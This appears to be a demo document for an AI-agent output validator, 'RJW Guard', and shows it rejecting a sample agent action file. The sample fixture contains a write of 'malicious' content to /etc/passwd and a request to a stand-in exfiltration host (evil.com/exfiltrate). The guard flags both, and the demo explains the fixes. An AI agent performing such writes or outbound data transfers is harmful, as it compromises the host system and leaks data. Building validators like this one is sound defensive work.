# Demo: RJW Guard (Fail Case)

## Scenario
Validating an unsafe agent output that violates multiple policies.

## Input File: `examples/bad.json`
```json
{
  "agent_id": "unsafe-agent",
  "timestamp": "2025-10-07T10:00:00Z",
  "version": "0.1.0-alpha",
  "actions": [
    {
      "type": "file_write",
      "path": "/etc/passwd",
      "content": "malicious",
      "signed": false
    }
  ],
  "steps": [
    {
      "type": "http_request",
      "url": "https://evil.com/exfiltrate",
      "network_allowed": false
    }
  ]
}
```

## Command
```bash
$ rjw guard examples/bad.json
```

## Output
```
✖ Policy violations: 3 (ruleset=default)
 • DRIFT_UNSAFE_WRITE @ $.actions[0] → Use sandboxed path or add signature verification
 • DRIFT_UNSAFE_PATH @ $.actions[0] → Use paths within project sandbox directory
 • NET_CALL_FORBIDDEN @ $.steps[0] → Rerun with --online or disable network access
```

## Exit Code
```
$ echo $?
2
```

## JSON Output (with --format json)
```bash
$ rjw guard examples/bad.json --format json
```

```json
{
  "input_source": "examples/bad.json",
  "passed": false,
  "violations": [
    {
      "code": "DRIFT_UNSAFE_WRITE",
      "severity": "error",
      "message": "Unsigned file write detected",
      "path": "$.actions[0]",
      "remediation": "Use sandboxed path or add signature verification"
    },
    {
      "code": "DRIFT_UNSAFE_PATH",
      "severity": "error",
      "message": "File write outside sandbox: /etc/passwd",
      "path": "$.actions[0]",
      "remediation": "Use paths within project sandbox directory"
    },
    {
      "code": "NET_CALL_FORBIDDEN",
      "severity": "error",
      "message": "Network call without permission",
      "path": "$.steps[0]",
      "remediation": "Rerun with --online or disable network access"
    }
  ],
  "summary": {
    "errors": 3,
    "warnings": 0,
    "ruleset": "default",
    "duration_ms": 15
  }
}
```

## Analysis of Violations

### 1. DRIFT_UNSAFE_WRITE
**Problem**: File write operation lacks signature verification
**Risk**: Unsigned writes could modify critical files without audit trail
**Fix**: Add `"signed": true` and implement signature verification

### 2. DRIFT_UNSAFE_PATH
**Problem**: Attempting to write to `/etc/passwd` (system file)
**Risk**: Could compromise system security
**Fix**: Use paths within project sandbox (e.g., `./sandbox/output.txt`)

### 3. NET_CALL_FORBIDDEN
**Problem**: Network request without explicit permission
**Risk**: Data exfiltration or unauthorized external communication
**Fix**: Either:
  - Remove network call if not needed
  - Add `"network_allowed": true` if reviewed and approved
  - Use `--online` flag if expected behavior

## Remediation Steps

1. **Rewrite to sandboxed path**:
   ```json
   {
     "type": "file_write",
     "path": "./sandbox/output.txt",
     "content": "safe content",
     "signed": true
   }
   ```

2. **Remove or justify network call**:
   - If needed: Document in decision log why network access required
   - If not needed: Remove the step entirely

3. **Re-validate**:
   ```bash
   $ rjw guard examples/fixed.json
   ✔ Validation passed
   ```

## Verdict
🛑 **DO NOT PROCEED** - Multiple critical security violations detected.

## Learning Points
- Always write to sandboxed directories
- Sign all file operations for audit trail
- Explicitly declare network requirements
- Use guard validation before executing agent outputs
